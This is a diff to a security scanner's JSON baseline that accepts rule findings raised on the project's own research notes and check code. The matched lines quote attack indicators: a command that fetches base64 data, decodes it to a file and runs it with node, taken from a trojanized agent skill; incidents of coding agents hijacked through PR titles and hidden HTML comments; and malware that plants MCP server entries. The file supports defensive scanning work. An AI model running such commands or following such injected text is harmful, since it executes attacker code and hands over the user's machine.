@@ -616,6 +616,193 @@
       "source": "builtin",
       "matched": "still validated, because llama-cpp-python silently falls back to plain JSON when a schema cannot be",
       "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-ENCODED-EXEC",
+      "line_hash": "ae6bbbf950a5f5f9db55953fb58a84c55e6fd8def048564231b7edb5ec150661",
+      "decision": "accept",
+      "note": "verified-claims ledger and docs quoting config paths and scanner behaviour; reviewed 2026-10-18",
+      "path": "docs/VERIFIED.md",
+      "line": 652,
+      "source": "builtin",
+      "matched": "- Zenity skills.sh payload: `curl -s -k \u2026/health | base64 -d > /tmp/t.mjs && node /tmp/t.mjs` in a setup file referenced from a clean SKILL.md \u2014 verified 2026-10-18 against the Zenity Labs write-up ci",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-ENCODED-EXEC",
+      "line_hash": "390dd7e88cce11be20bd98e3fbd60675721804e68d1f9407b8fe486f9b1173f5",
+      "decision": "accept",
+      "note": "landscape research report quoting attack indicators; reviewed 2026-10-18",
+      "path": "docs/research/2026-10-landscape.md",
+      "line": 19,
+      "source": "builtin",
+      "matched": "  containing `curl -s -k \u2026/health | base64 -d > /tmp/t.mjs && node /tmp/t.mjs`.",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-ENCODED-EXEC",
+      "line_hash": "09dfffb68bfe226fb84c5e3762f78106a610632d18b0db0d96859ae83a65d669",
+      "decision": "accept",
+      "note": "landscape research report quoting attack indicators; reviewed 2026-10-18",
+      "path": "docs/research/2026-10-landscape.md",
+      "line": 50,
+      "source": "builtin",
+      "matched": "| 2026-07-11 to 08-02 | **Zenity Labs: trojanized skills on skills.sh, 1.7M aggregate installs.** Lookalike orgs `getpaperclipai` and `browser-use-headless` uploaded clean copies, then swapped in mali",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-SECRECY",
+      "line_hash": "030b7b7ae82d646889dc27de4752cdd131e61d7d9bffa574d35d7b041173a99e",
+      "decision": "accept",
+      "note": "landscape research report quoting attack indicators; reviewed 2026-10-18",
+      "path": "docs/research/2026-10-landscape.md",
+      "line": 51,
+      "source": "builtin",
+      "matched": "| 2026-06-03 | **Trail of Bits, \"The sorry state of skill distribution\".** They bypassed every scanner tested: ClawHub (VirusTotal plus a GPT guard), skills.sh (Gen, Socket, Snyk) and Cisco skill-scan",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-PASTE-HOST",
+      "line_hash": "57da80a34c69a0c13412d3ed6b9d790712e4d47f76e56572c9c94ac9cbecc397",
+      "decision": "accept",
+      "note": "landscape research report quoting attack indicators; reviewed 2026-10-18",
+      "path": "docs/research/2026-10-landscape.md",
+      "line": 52,
+      "source": "builtin",
+      "matched": "| 2026-09-22 | **Signals Corps scan of 81,535 ClawHub SKILL.md files after ClawHavoc.** 0 confirmed malicious among counted skills. ClawHavoc techniques (fake prerequisites, password zips, glot.io) we",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-SENSITIVE-PATH",
+      "line_hash": "7c1ddf7ea2ae9b02fc1bffec5f8be69b6992147e17c474024b67d1fd770c5cde",
+      "decision": "accept",
+      "note": "landscape research report quoting attack indicators; reviewed 2026-10-18",
+      "path": "docs/research/2026-10-landscape.md",
+      "line": 74,
+      "source": "builtin",
+      "matched": "| current docs | **OpenCode permission defaults are permissive.** \"Most permissions default to `allow`\". Only `doom_loop` and `external_directory` default to `ask`, and reads of `*.env` are denied. `\"",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-SENSITIVE-PATH",
+      "line_hash": "2455253cf3d68774e3bf8cf58ec368fdb8d8af55cf2d49952946aee9aa0e3982",
+      "decision": "accept",
+      "note": "landscape research report quoting attack indicators; reviewed 2026-10-18",
+      "path": "docs/research/2026-10-landscape.md",
+      "line": 78,
+      "source": "builtin",
+      "matched": "| 2026-04-24 | **Gemini CLI / run-gemini-cli GHSA-wpqr-6v78-jr5g (CVSS 10).** Headless mode trusted the workspace and loaded `.gemini/` env/config from a PR. `--yolo` ignored the tool allowlist (`run_",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-SENSITIVE-PATH",
+      "line_hash": "8ba0c5c20db0d31f978683844299df806b9f7341c01a4de6b2b9ecdd3f3abc5a",
+      "decision": "accept",
+      "note": "landscape research report quoting attack indicators; reviewed 2026-10-18",
+      "path": "docs/research/2026-10-landscape.md",
+      "line": 86,
+      "source": "builtin",
+      "matched": "| 2026-04-15 to 08-07 | **\"Comment and Control\"** (Aonan Guan with Johns Hopkins; Novee at Black Hat 2026-08-05). PR titles, issue bodies and hidden HTML comments hijack Claude Code, Gemini CLI and th",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-SECRECY",
+      "line_hash": "dbc130c50a47cfb15411626cc82f1049d08e53120ea60825c149737d5c9b76de",
+      "decision": "accept",
+      "note": "landscape research report quoting attack indicators; reviewed 2026-10-18",
+      "path": "docs/research/2026-10-landscape.md",
+      "line": 96,
+      "source": "builtin",
+      "matched": "| 2026-02-20 (earlier) | **SANDWORM_MODE (Socket).** The `McpInject` module plants an `mcpServers` entry (random dev-sounding name, `node ~/.<name>/server.js`) in Claude Code, Claude Desktop, Cursor, ",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-SENSITIVE-PATH",
+      "line_hash": "dbc130c50a47cfb15411626cc82f1049d08e53120ea60825c149737d5c9b76de",
+      "decision": "accept",
+      "note": "landscape research report quoting attack indicators; reviewed 2026-10-18",
+      "path": "docs/research/2026-10-landscape.md",
+      "line": 96,
+      "source": "builtin",
+      "matched": "| 2026-02-20 (earlier) | **SANDWORM_MODE (Socket).** The `McpInject` module plants an `mcpServers` entry (random dev-sounding name, `node ~/.<name>/server.js`) in Claude Code, Claude Desktop, Cursor, ",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-SECRECY",
+      "line_hash": "a3bd07e69238e72d7058bdd052e3f20f345a64988164f9d45fa4eef03da3bdb2",
+      "decision": "accept",
+      "note": "landscape research report quoting attack indicators; reviewed 2026-10-18",
+      "path": "docs/research/2026-10-landscape.md",
+      "line": 109,
+      "source": "builtin",
+      "matched": "| 2026-06-15 | **GlassWASM (Socket).** Two Open VSX extensions (`ExarGD.vsblack`, `noellee-doc.flint-debug`) cloned Marketplace identities. That is cross-registry impersonation, not typosquatting, and",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-SECRECY",
+      "line_hash": "8691f7fb35e93bb1414798f95acd9203ae396a49048a95348e0d758c1bf6919e",
+      "decision": "accept",
+      "note": "landscape research report quoting attack indicators; reviewed 2026-10-18",
+      "path": "docs/research/2026-10-landscape.md",
+      "line": 117,
+      "source": "builtin",
+      "matched": "| 2026-10-05 / 09-29 | Claude Code CVE-2026-103435 (symlink TOCTOU write, fixed 2.1.129). CVE-2026-103012 (server-managed settings silently skipped if a stale API key was stored; deny rules not applie",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-ENCODED-EXEC",
+      "line_hash": "4f19243e61bad16185fd7cf947b34e36f49d868532be13de52b331e4792256a7",
+      "decision": "accept",
+      "note": "landscape research report quoting attack indicators; reviewed 2026-10-18",
+      "path": "docs/research/2026-10-landscape.md",
+      "line": 183,
+      "source": "builtin",
+      "matched": "`curl -s -k \u2026/health | base64 -d > /tmp/t.mjs && node /tmp/t.mjs`. Tested today: no finding, because",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-SECRECY",
+      "line_hash": "20c4369db297ae4e45542be3cad4ca3eedbcafa68486e99dd20a396b4ef7b04b",
+      "decision": "accept",
+      "note": "landscape research report quoting attack indicators; reviewed 2026-10-18",
+      "path": "docs/research/2026-10-landscape.md",
+      "line": 190,
+      "source": "builtin",
+      "matched": "**Detects:** instead of silently dropping files, emit an `RT-UNSCANNED` finding (low; medium inside a",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-SENSITIVE-PATH",
+      "line_hash": "b9916aac1a84ba233160063f26b4206767987b3e7c8820cda8b472fde93dfbea",
+      "decision": "accept",
+      "note": "landscape research report quoting attack indicators; reviewed 2026-10-18",
+      "path": "docs/research/2026-10-landscape.md",
+      "line": 234,
+      "source": "builtin",
+      "matched": "- `npm config set registry`, `.npmrc` `registry=`, `pip --index-url`/`--extra-index-url`, and",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-SENSITIVE-PATH",
+      "line_hash": "f5c48dd424d3a8e068c17def95b881106b175de96daeb32518fc5bfe230fb6aa",
+      "decision": "accept",
+      "note": "the check's own pattern or docstring describing the attack it detects",
+      "path": "unpick/checks/agent_settings.py",
+      "line": 92,
+      "source": "builtin",
+      "matched": "    return doc.is_json or doc.name.endswith(\".toml\") or doc.is_markdown or doc.name.endswith((\".sh\", \".ps1\", \".env.example\"))",
+      "decided_at": "2026-10-18T00:00:00+00:00"
+    },
+    {
+      "rule_id": "RT-SENSITIVE-PATH",
+      "line_hash": "008d6b27d49d7ca57523b746ccc03499b5446970c9f6ae5e1900d25019d0e4a2",
+      "decision": "accept",
+      "note": "the check's own pattern or docstring describing the attack it detects",
+      "path": "unpick/checks/agent_settings.py",
+      "line": 96,
+      "source": "builtin",
+      "matched": "    if doc.is_markdown or doc.name.endswith((\".sh\", \".ps1\", \".env.example\")):",
+      "decided_at": "2026-10-18T00:00:00+00:00"
     }
   ]
 }
